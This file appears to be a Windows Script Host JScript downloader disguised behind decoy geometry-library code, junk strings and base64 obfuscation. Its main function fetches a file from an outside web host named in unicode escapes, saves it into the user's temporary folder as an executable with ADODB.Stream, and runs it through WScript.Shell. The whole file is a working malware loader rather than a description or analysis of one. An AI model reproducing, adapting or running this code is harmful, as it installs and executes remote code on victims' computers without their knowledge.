
var partnerships = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  tribes = [];
	
var uplifting = { ':': '.','U': 'S','381': 'X'};
	var awkwardness = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function strap(snapshot) {
	obtrusive = snapshot;
	for (var i in uplifting){obtrusive = obtrusive.replace(i, uplifting[i]);}
    return obtrusive;
};

var bowman = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.strap4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/newman/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = partnerships[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = partnerships[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = partnerships[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = partnerships[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var blast ="newmanJVnewmanRFTVnewmanAl".strap4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var leader = "newmanQWnewmanN0aXZnewmanlWE9ianewmanmVjdA=newman=".strap4();
String.prototype.strap2 = function () {
    var migrant = {
        panels: this
    };
    migrant.greatest = migrant.panels["c3Vic3RyaW5n".strap4()](awkwardness, bowman);
    return migrant.greatest;
};

var bedford ="newmanRXhwYW5newmankRW52aXnewmanJvbm1lbnRTdHJnewmanpbmdz".strap4();
var Native = function(options){
	
};
var educator = [leader, bedford,blast,  ""+"."+("acclaimed","wrestle","steadfastness","napkin","testing","instrumental","idiomatic","nonexistent","exe"), "UnVu".strap4(), strap("M"+"SX"+"ML"+("reform","politicians","sarcastically","simon","sunder","crescent","factious","2.")+"381M"+"LH"+"TT"+("parties","decorum","begun","rentals","jocose","libraries","flagstaff","objectively","P>")+"WU"+("period","pacify","fighting","enjoyable","uphill","speed","catarrh","cr")+("visual","exotic","rainfall","elizabethan","odium","chief","newspapers","browse","ip")+"t:"+("tacks","kinship","wearisome","genuine","textiles","gambia","sapphire","nieces","Sh")+"ell")];
diadem = "_F2_";
var dappled = this[educator.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
btUnfKjijm = "xdnQjByILv";
crochet = (("castor", "insurgent", "holler", "consumes", "kelly", "separated", "carinthia", "ppKLvVrXK") + "lKneInBh").strap2();
appendix = (("newly", "satin", "bargains", "genetic", "apply", "chivalric", "comfortable", "tribulation", "provencal", "sXFxaUtgN") + "buTPms").strap2();
  
    String.prototype.roger = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var characteristically = educator.pop().split(">");

organizational = "b3Blbg==".strap4();
var griffith = new dappled(characteristically[1]);
var christian = new dappled(characteristically[0]);
var voters = griffith[educator.shift()](educator.shift());
weasel = "E";

var wallpapers = educator.shift();
var obtainable = educator.shift();
function aircraft(lintel, conscious) {

    try {
        var trusted = voters + "/" + conscious ;
		trusted = trusted+ wallpapers;
            christian[organizational](("drugs","stitching","rockies","electrified","liken","fiftyfour","laconically","attest","G" + weasel) + ("trend","outline","words","analyst","clinch","partnership","fighter","jesse","theories","health","T"), lintel, false);
       
    christian[appendix + ("champagne","baboon","end")]();
	var windsor=("crochet" + WScript=="crochet" + "V2luZG93cyBTY3JpcHQgSG9zdA==".strap4())&&christian["c3RhdHVz".strap4()] +""=="MjAw".strap4()&&typeof(ejAJNRjyP)==="undefined";

    if (windsor) {
		
        var augustinian = new dappled((("broth","press","durance","virtual","publisher","sweden","crisis","complacent","A")+("bruno","creativity","troubadour","chloride","subway","membrane","dublin","inkstand","SEOO")+"DB"+("three","reddy","certificate","verse","embrasure","inexorably","flounder",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        augustinian[organizational]();
        MPjhVYqn = "_F9_";
        augustinian.type = bowman;
        OapOsohkWq = "_F10_";
        augustinian["d3JpdGU=".strap4()](christian[("appalled","eater","unconvinced","three","chipped","granny","spanish","")+"R"+"es"+"pon"+uplifting['U'].toLowerCase()+"e"+"Qm9keQ==".strap4()]);
        vyUAEdaxF = "_F11_";
        augustinian[(crochet + "o"+("tenfold","quondam","funnel","blues","shingle","encroachment","stimulate","guidance","00")+("julian","quebec","invasion","eightythree","rogers","garrulous","unlikely","8i")+"tion").replace("0"+("russia","implementing","armful","sward","radiate","parasol","passwords","08"), appendix)] = 0;
        wYjwGq = "_F12_";
        augustinian.saveToFile(trusted, 2);
        YfuCBxCCN = "_F13_";
        augustinian.close();
        iuFGmhoc = "_F14_";
		griffith[obtainable](trusted, bowman, true);
    }
} catch (TIBSXSH) { };

    sbfsLWCkQ = "_F15_";
}
try{
aircraft("aHRnewman0cDnewmanovLw=newman=".strap4()+"\u0077\u0077\u0077"+"\u002E\u0073\u0074\u0075\u0064\u0069\u006F\u0070\u0061\u0072\u0063\u0069\u0061\u006E\u0065\u006C\u006C\u006F\u002E\u0063\u006F\u006D\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?YTasWPIRcYy=QUtsvVw","vITPjBI");}catch(vwdvum){}

   inBKKjg = "_F16_";
   